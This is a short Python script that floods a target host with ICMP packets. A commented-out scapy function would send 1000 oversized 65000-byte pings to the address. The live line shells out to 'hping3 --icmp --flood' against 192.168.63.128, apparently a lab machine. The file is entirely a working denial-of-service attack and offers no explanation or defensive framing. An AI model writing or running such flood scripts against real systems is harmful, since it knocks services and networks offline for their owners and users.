import os

#def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
 #   ip = IP(dst=target_ip_address)
  #  icmp = ICMP()
   # raw = Raw(b"X" * size_of_packet)
    #p = ip / icmp / raw
    #send(p, count=number_of_packets_to_send, verbose=0)
    #print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)


ip = "192.168.63.128"
#port = 80
#send_ping(ip, number_of_packets_to_send=1000)

os.system("hping3 --icmp --flood " + (ip))